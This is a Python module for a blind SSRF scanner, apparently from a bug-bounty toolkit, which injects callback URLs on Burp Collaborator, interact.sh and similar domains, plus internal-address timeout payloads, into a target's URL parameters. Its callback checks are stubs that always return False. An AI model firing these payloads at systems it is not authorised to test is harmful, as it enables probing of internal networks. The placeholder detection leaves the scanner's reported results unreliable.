"""
╔══════════════════════════════════════════════════════════════╗
║       ⚔️  ALBATTAR BUGS - Blind SSRF Scanner  ⚔️            ║
║              Created by ROBIN | @ll bUg                     ║
╚══════════════════════════════════════════════════════════════╝

Blind SSRF Scanner
------------------
يكتشف ثغرات Blind SSRF التي لا تعيد الاستجابة مباشرة
باستخدام:
- Out-of-Band (OOB) techniques
- DNS callbacks
- HTTP callbacks
- Time-based detection
"""

import re
import time
import hashlib
import socket
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, quote
import requests

from core.base_scanner import BaseScanner
from core.http_handler import HTTPHandler
from utils.logger import Logger
from utils.colors import Colors


class BlindSSRFScanner(BaseScanner):
    """
    ماسح Blind SSRF المتقدم
    """
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        self.name = "Blind SSRF Scanner"
        self.description = "Detects Blind SSRF using OOB techniques"
        self.severity = "HIGH"
        
        self.logger = Logger(__name__)
        self.colors = Colors()
        self.http_handler = HTTPHandler(config)
        
        # Callback domains for OOB
        self.callback_domains = [
            "burpcollaborator.net",
            "oastify.com",
            "interact.sh",
            "canarytokens.com"
        ]
        
        # Generate unique identifier
        self.unique_id = self._generate_unique_id()
        
        # OOB payloads
        self.oob_payloads = self._load_oob_payloads()
        
        # Time-based payloads
        self.time_payloads = self._load_time_payloads()
        
        # Results
        self.vulnerabilities = []
        
        # Statistics
        self.stats = {
            'total_tests': 0,
            'callbacks_received': 0,
            'time_based_detected': 0
        }
    
    def _generate_unique_id(self) -> str:
        """توليد معرف فريد"""
        timestamp = str(time.time()).replace('.', '')
        return f"ssrf_{hashlib.md5(timestamp.encode()).hexdigest()[:12]}"
    
    def _load_oob_payloads(self) -> List[Dict]:
        """تحميل OOB payloads"""
        payloads = []
        
        for domain in self.callback_domains:
            payloads.extend([
                {
                    "payload": f"http://{self.unique_id}.{domain}",
                    "type": "http_callback",
                    "description": f"HTTP callback to {domain}"
                },
                {
                    "payload": f"https://{self.unique_id}.{domain}",
                    "type": "https_callback",
                    "description": f"HTTPS callback to {domain}"
                },
                {
                    "payload": f"//{self.unique_id}.{domain}",
                    "type": "protocol_relative",
                    "description": f"Protocol-relative callback to {domain}"
                }
            ])
        
        return payloads
    
    def _load_time_payloads(self) -> List[Dict]:
        """تحميل Time-based payloads"""
        return [
            {
                "payload": "http://127.0.0.1:9999",
                "type": "timeout",
                "description": "Timeout on closed port",
                "expected_delay": 5
            },
            {
                "payload": "http://192.168.255.255",
                "type": "timeout",
                "description": "Timeout on non-existent host",
                "expected_delay": 5
            }
        ]
    
    def scan(self) -> List[Dict]:
        """
        بدء فحص Blind SSRF
        """
        self.logger.info(f"{self.colors.BLUE}Starting Blind SSRF scan on {self.target}{self.colors.RESET}")
        
        try:
            # 1. Test OOB callbacks
            self._test_oob_callbacks()
            
            # 2. Test time-based detection
            self._test_time_based()
            
            # 3. Test DNS exfiltration
            self._test_dns_exfiltration()
            
            self.logger.info(
                f"{self.colors.GREEN}Blind SSRF scan complete. "
                f"Found {len(self.vulnerabilities)} vulnerabilities{self.colors.RESET}"
            )
            
        except Exception as e:
            self.logger.error(f"Error during Blind SSRF scan: {str(e)}")
        
        return self.vulnerabilities
    
    def _test_oob_callbacks(self):
        """اختبار OOB callbacks"""
        self.logger.info("Testing OOB callbacks...")
        
        params = self._extract_parameters()
        
        for param in params:
            for payload_data in self.oob_payloads:
                try:
                    test_url = self._build_test_url(param, payload_data["payload"])
                    
                    # Send request
                    self.http_handler.get(test_url, timeout=10)
                    self.stats['total_tests'] += 1
                    
                    # Wait and check for callback
                    time.sleep(2)
                    
                    if self._check_callback_received(payload_data["payload"]):
                        self._report_vulnerability(
                            param=param,
                            payload=payload_data["payload"],
                            payload_data=payload_data,
                            detection_method="OOB Callback"
                        )
                        self.stats['callbacks_received'] += 1
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    self.logger.debug(f"Error testing OOB: {str(e)}")
    
    def _test_time_based(self):
        """اختبار Time-based detection"""
        self.logger.info("Testing time-based detection...")
        
        params = self._extract_parameters()
        
        for param in params:
            for payload_data in self.time_payloads:
                try:
                    test_url = self._build_test_url(param, payload_data["payload"])
                    
                    start_time = time.time()
                    try:
                        self.http_handler.get(test_url, timeout=10)
                    except:
                        pass
                    elapsed = time.time() - start_time
                    
                    self.stats['total_tests'] += 1
                    
                    # Check if delay matches expected
                    if elapsed >= payload_data["expected_delay"] - 1:
                        self._report_vulnerability(
                            param=param,
                            payload=payload_data["payload"],
                            payload_data=payload_data,
                            detection_method="Time-based",
                            delay=elapsed
                        )
                        self.stats['time_based_detected'] += 1
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    self.logger.debug(f"Error testing time-based: {str(e)}")
    
    def _test_dns_exfiltration(self):
        """اختبار DNS exfiltration"""
        self.logger.info("Testing DNS exfiltration...")
        
        params = self._extract_parameters()
        
        for param in params:
            for domain in self.callback_domains:
                try:
                    # Embed data in subdomain
                    payload = f"http://data-{self.unique_id}.{domain}"
                    test_url = self._build_test_url(param, payload)
                    
                    self.http_handler.get(test_url, timeout=10)
                    self.stats['total_tests'] += 1
                    
                    time.sleep(2)
                    
                    if self._check_dns_callback(payload):
                        self._report_vulnerability(
                            param=param,
                            payload=payload,
                            detection_method="DNS Exfiltration"
                        )
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    self.logger.debug(f"Error testing DNS exfiltration: {str(e)}")
    
    def _check_callback_received(self, payload: str) -> bool:
        """
        التحقق من استلام callback
        في بيئة حقيقية، يجب التكامل مع خدمة callback
        """
        # TODO: Integrate with Burp Collaborator / Interact.sh API
        # This is a placeholder
        return False
    
    def _check_dns_callback(self, payload: str) -> bool:
        """
        التحقق من DNS callback
        """
        # TODO: Integrate with DNS monitoring service
        return False
    
    def _extract_parameters(self) -> List[str]:
        """استخراج Parameters"""
        params = []
        if "?" in self.target:
            query_string = self.target.split("?")[1]
            for param_pair in query_string.split("&"):
                if "=" in param_pair:
                    params.append(param_pair.split("=")[0])
        return params
    
    def _build_test_url(self, param: str, payload: str) -> str:
        """بناء URL الاختبار"""
        if "?" not in self.target:
            return f"{self.target}?{param}={payload}"
        
        base_url = self.target.split("?")[0]
        query_params = []
        
        for param_pair in self.target.split("?")[1].split("&"):
            if "=" in param_pair:
                param_name, param_value = param_pair.split("=", 1)
                if param_name == param:
                    query_params.append(f"{param_name}={payload}")
                else:
                    query_params.append(param_pair)
        
        return f"{base_url}?{'&'.join(query_params)}"
    
    def _report_vulnerability(self, **kwargs):
        """تسجيل ثغرة"""
        vulnerability = {
            "type": "Blind Server-Side Request Forgery",
            "severity": "HIGH",
            "url": self.target,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "cvss_score": 7.5,
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery"
        }
        
        vulnerability.update(kwargs)
        
        # Add exploitation guide
        vulnerability['exploitation'] = {
            "difficulty": "Medium",
            "requirements": [
                "OOB callback service (Burp Collaborator, interact.sh)",
                "Understanding of DNS/HTTP protocols",
                "Time measurement capabilities"
            ],
            "steps": [
                "1. Inject OOB payload with unique identifier",
                "2. Monitor callback service for incoming requests",
                "3. Confirm SSRF by matching unique identifier",
                "4. Exploit for internal network access"
            ]
        }
        
        # Add remediation
        vulnerability['remediation'] = {
            "priority": "HIGH",
            "recommendations": [
                "Implement strict URL validation",
                "Block outbound requests to internal IPs",
                "Use allowlist for permitted domains",
                "Monitor outbound connections",
                "Implement request timeouts"
            ]
        }
        
        self.vulnerabilities.append(vulnerability)
        
        self.logger.warning(
            f"{self.colors.RED}[VULN FOUND] Blind SSRF Detected!{self.colors.RESET}\n"
            f"  Method: {kwargs.get('detection_method', 'Unknown')}\n"
            f"  Payload: {kwargs.get('payload', 'N/A')[:80]}"
        )
    
    def generate_report(self) -> Dict:
        """توليد تقرير"""
        return {
            "scanner": self.name,
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "statistics": self.stats,
            "summary": self._generate_summary()
        }
    
    def _generate_summary(self) -> str:
        """توليد ملخص"""
        if not self.vulnerabilities:
            return "No Blind SSRF vulnerabilities detected."
        
        summary = f"""
Blind SSRF Scan Summary:
------------------------
Total Vulnerabilities: {len(self.vulnerabilities)}
OOB Callbacks: {self.stats['callbacks_received']}
Time-based Detections: {self.stats['time_based_detected']}

Findings:
"""
        for i, vuln in enumerate(self.vulnerabilities, 1):
            summary += f"\n{i}. {vuln.get('detection_method', 'Unknown')}"
            summary += f"\n   Parameter: {vuln.get('param', 'N/A')}"
            summary += f"\n   Payload: {vuln.get('payload', 'N/A')[:60]}..."
            summary += "\n"
        
        return summary


# ═══════════════════════════════════════════════════════════════
#                          USAGE EXAMPLE
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    """
    مثال على الاستخدام
    """
    
    config = {
        "timeout": 10,
        "user_agent": "AlBaTTaR-BUGS/1.0 (Blind SSRF Scanner)"
    }
    
    target = "https://example.com/fetch?url=https://google.com"
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║       ⚔️  ALBATTAR BUGS - Blind SSRF Scanner  ⚔️            ║
║                Created by ROBIN | @ll bUg                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    scanner = BlindSSRFScanner(target, config)
    
    print(f"\n[*] Starting Blind SSRF scan on: {target}\n")
    vulnerabilities = scanner.scan()
    
    report = scanner.generate_report()
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n{Colors.RED}[!] Found {len(vulnerabilities)} Blind SSRF vulnerabilities{Colors.RESET}\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{i}. {vuln.get('detection_method', 'Unknown')}")
            print(f"   Parameter: {vuln.get('param', 'N/A')}")
            print(f"   Confidence: {vuln.get('confidence', 'N/A')}")
            print()
    else:
        print(f"\n{Colors.GREEN}[✓] No Blind SSRF vulnerabilities found{Colors.RESET}\n")
    
    print(report['summary'])
    
    # Save report
    import json
    with open('blind_ssrf_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n{Colors.GREEN}[✓] Report saved to: blind_ssrf_report.json{Colors.RESET}\n")